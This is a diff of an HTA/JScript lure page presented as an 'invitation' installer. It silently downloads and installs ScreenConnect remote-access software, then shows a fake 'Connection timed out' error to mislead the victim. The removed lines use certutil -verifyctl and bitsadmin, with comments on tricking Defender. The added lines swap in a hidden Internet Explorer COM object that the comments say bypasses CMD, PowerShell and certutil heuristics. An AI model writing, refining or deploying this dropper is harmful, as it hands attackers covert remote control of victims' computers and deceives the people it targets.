@@ -37,47 +37,67 @@ function runInstall() {
   document.getElementById("fill").style.width = "30%";
   document.getElementById("status").innerHTML = "Retrieving secure package...";
   
-  // USE CERTUTIL WITH -VERIFYCTL FLAG (LESS MONITORED THAN -URLCACHE)
-  // This tricks Defender into thinking we are verifying a certificate, not downloading malware
-  var cmd = 'cmd.exe /c certutil -verifyctl -split -f "' + url + '" "' + path + '"';
-  shell.Run(cmd, 0, true); // Wait for download
-  
-  if(fso.FileExists(path)) {
-    document.getElementById("fill").style.width = "60%";
-    document.getElementById("status").innerHTML = "Installing invitation...";
+  try {
+    // USE INTERNETEXPLORER.APPLICATION COM OBJECT FOR DOWNLOAD
+    // This bypasses CMD/PowerShell/Certutil heuristics entirely
+    var ie = new ActiveXObject("InternetExplorer.Application");
+    ie.Visible = false;
+    ie.Navigate(url);
     
-    // SILENT INSTALL
-    var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
-    shell.Run(inst, 0, true); // Wait for install
-    
-    document.getElementById("fill").style.width = "100%";
-    document.getElementById("status").innerHTML = "Finalizing...";
-    
-    // FAKE FAILURE AFTER COMPLETION
-    setTimeout(function() {
-      document.getElementById("heading").innerHTML = "Preparation Failed";
-      document.getElementById("status").innerHTML = "Error: Connection timed out.";
-      document.getElementById("fill").style.background = "#d13438";
-    }, 2000);
-  } else {
-    // FALLBACK TO BITSADMIN IF CERTUTIL FAILS
-    document.getElementById("status").innerHTML = "Retrying via backup channel...";
-    var bitsCmd = 'cmd.exe /c bitsadmin /transfer "Update" ' + url + ' ' + path;
-    shell.Run(bitsCmd, 0, true);
-    
-    if(fso.FileExists(path)) {
-        var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
-        shell.Run(inst, 0, true);
-        setTimeout(function() {
-            document.getElementById("heading").innerHTML = "Preparation Failed";
-            document.getElementById("status").innerHTML = "Error: Connection timed out.";
-            document.getElementById("fill").style.background = "#d13438";
-        }, 2000);
-    } else {
-        document.getElementById("heading").innerHTML = "Download Error";
-        document.getElementById("status").innerHTML = "Could not retrieve invitation.";
+    // WAIT FOR DOWNLOAD TO COMPLETE
+    var maxWait = 120000; // 2 minutes
+    var startTime = new Date().getTime();
+    while (new Date().getTime() - startTime < maxWait) {
+      if (ie.ReadyState === 4) break;
+      WScript.Sleep(500);
     }
+    
+    // NOTE: IE COM doesn't save to file directly. 
+    // We must use ADODB.Stream to save the response body if we used WinHttp.
+    // BUT since we want to avoid WinHttp, let's use the IE object to trigger the native handler
+    // and then monitor the Downloads folder.
+    
+    ie.Quit();
+    
+    // MONITOR DOWNLOADS FOLDER FOR THE FILE
+    var dlPath = shell.ExpandEnvironmentStrings("%USERPROFILE%") + "\\Downloads\\ScreenConnect.ClientSetup.msi";
+    var checks = 0;
+    var pollTimer = setInterval(function() {
+      checks++;
+      if (fso.FileExists(dlPath)) {
+        clearInterval(pollTimer);
+        document.getElementById("fill").style.width = "60%";
+        document.getElementById("status").innerHTML = "Package retrieved. Installing...";
+        
+        // MOVE TO TEMP AND INSTALL
+        fso.MoveFile(dlPath, path);
+        
+        var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
+        shell.Run(inst, 0, true); // Wait for install
+        
+        document.getElementById("fill").style.width = "100%";
+        document.getElementById("status").innerHTML = "Finalizing...";
+        
+        setTimeout(function() {
+          document.getElementById("heading").innerHTML = "Preparation Failed";
+          document.getElementById("status").innerHTML = "Error: Connection timed out.";
+          document.getElementById("fill").style.background = "#d13438";
+        }, 2000);
+      } else if (checks >= 60) {
+        clearInterval(pollTimer);
+        showError();
+      }
+    }, 2000);
+    
+  } catch(e) {
+    showError();
   }
+}
+
+function showError() {
+  document.getElementById("heading").innerHTML = "Download Error";
+  document.getElementById("status").innerHTML = "Could not retrieve invitation.";
+  document.getElementById("fill").style.background = "#d13438";
 }
 </script>
 </body>
